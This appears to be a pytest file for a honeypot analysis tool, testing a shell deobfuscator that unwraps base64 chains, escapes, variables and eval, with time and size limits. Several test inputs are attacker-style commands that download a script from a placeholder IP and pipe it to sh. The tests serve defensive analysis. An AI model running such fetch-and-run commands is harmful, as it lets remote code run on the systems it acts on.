from __future__ import annotations

import base64
import time

from suckerpot_analysis import deobfuscate_shell


def b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def kinds(r: object) -> dict[str, int]:
    return {s.kind: s.count for s in r.steps}  # type: ignore[attr-defined]


def test_base64_pipe_to_shell() -> None:
    payload = "wget http://192.0.2.7/a.sh -O- | sh"
    r = deobfuscate_shell(f"echo {b64(payload)} | base64 -d | sh")
    assert r.text == payload
    assert kinds(r) == {"base64": 1}


def test_base64_here_string_and_quotes() -> None:
    r = deobfuscate_shell(f"base64 --decode <<< '{b64('curl http://198.51.100.9/x')}'")
    assert r.text == "curl http://198.51.100.9/x"
    r = deobfuscate_shell(f'printf "{b64("id; uname -a")}" | base64 -d')
    assert r.text == "id; uname -a"


def test_nested_base64() -> None:
    inner = f"echo {b64('cd /tmp; wget http://203.0.113.5/z')} | base64 -d | sh"
    r = deobfuscate_shell(f"echo {b64(inner)} | base64 -d | sh")
    assert r.text == "cd /tmp; wget http://203.0.113.5/z"
    assert kinds(r)["base64"] == 2


def test_binary_base64_left_alone() -> None:
    blob = base64.b64encode(bytes(range(256))).decode()
    text = f"echo {blob} | base64 -d"
    assert deobfuscate_shell(text).text == text


def test_escapes() -> None:
    assert deobfuscate_shell(r"printf '\x77\x67\x65\x74 \101'").text == "printf 'wget A'"
    assert deobfuscate_shell(r"echo -e '\x41\x42'").text == "echo -e 'AB'"
    assert deobfuscate_shell(r"$'\x63\x75rl' x").text == "'curl' x"
    # quotes and backslash stay escaped
    assert deobfuscate_shell(r"echo -e '\x27'").text == r"echo -e '\x27'"


def test_variables() -> None:
    script = "a=wget\nb='http://192.0.2.3/x'\n$a ${b}\n"
    r = deobfuscate_shell(script)
    assert "wget http://192.0.2.3/x" in r.text
    assert kinds(r)["variables"] >= 2


def test_command_substitution_not_evaluated() -> None:
    r = deobfuscate_shell("a=$(id)\necho $a\n")
    assert "$a" in r.text
    assert "$(id)" in r.text


def test_join_quotes_and_eval() -> None:
    assert deobfuscate_shell("'ht''tp'").text == "'http'"
    assert deobfuscate_shell("w''get").text == "wget"
    assert deobfuscate_shell('eval "wget http://192.0.2.1/x"').text == "wget http://192.0.2.1/x"


def test_self_expanding_variable_is_bounded() -> None:
    script = "a='$a$a'\n" + "$a " * 1000
    start = time.monotonic()
    r = deobfuscate_shell(script, max_out=64 * 1024)
    assert time.monotonic() - start < 5
    assert len(r.text.encode()) <= 64 * 1024


def test_growing_base64_chain_is_bounded() -> None:
    text = "echo hello world"
    for _ in range(10):
        text = f"echo {b64(text * 2)} | base64 -d | sh"
    r = deobfuscate_shell(text, max_passes=5, max_out=32 * 1024)
    assert len(r.text.encode()) <= 32 * 1024


def test_huge_single_line_returns_quickly() -> None:
    start = time.monotonic()
    r = deobfuscate_shell("'a" * (8 * 1024 * 1024))
    assert time.monotonic() - start < 10
    assert r.truncated
    start = time.monotonic()
    deobfuscate_shell("echo " + "A" * 900_000)
    deobfuscate_shell("a=" + "'" * 500_000)
    assert time.monotonic() - start < 10


def test_pass_limit() -> None:
    inner = "echo done"
    text = inner
    for _ in range(4):
        text = f"echo {b64(text)} | base64 -d | sh"
    assert deobfuscate_shell(text, max_passes=2).text != inner
    assert deobfuscate_shell(text, max_passes=5).text == inner
